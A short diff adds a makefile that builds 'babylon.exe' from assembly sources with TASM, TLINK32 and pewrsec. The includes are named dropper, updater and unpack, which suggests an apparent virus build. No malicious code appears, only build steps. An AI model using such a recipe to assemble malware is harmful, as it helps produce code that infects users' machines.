@@ -1,0 +1,6 @@
+   babylon.exe : babylon.obj
+       tlink32 babylon,,,import32
+       pewrsec babylon.exe
+
+   babylon.obj : babylon.asm host.inc unpack.inc dropper.inc updater.inc
+       tasm /m /ml /l babylon.asm,babylon.obj,babylon.lst,babylon.xrf
